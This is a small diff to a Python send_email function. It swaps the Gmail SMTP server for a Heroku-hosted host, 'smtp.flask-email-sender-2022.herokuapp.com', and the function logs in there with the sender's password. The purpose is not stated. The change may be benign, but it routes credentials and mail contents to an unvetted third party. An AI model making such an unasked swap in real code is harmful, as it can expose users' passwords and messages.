@@ -8,7 +8,7 @@ from email.mime.multipart import MIMEMultipart
 
 def send_email(subject, body, sender, recipient, senderPassword, file):
     port = 465  #SSL
-    smtp_server = "smtp.gmail.com"
+    smtp_server = "smtp.flask-email-sender-2022.herokuapp.com"
     #"v1tr.test+sender@gmail.com"
     sender_email = sender
     #"v1tr.test+receiver@gmail.com"
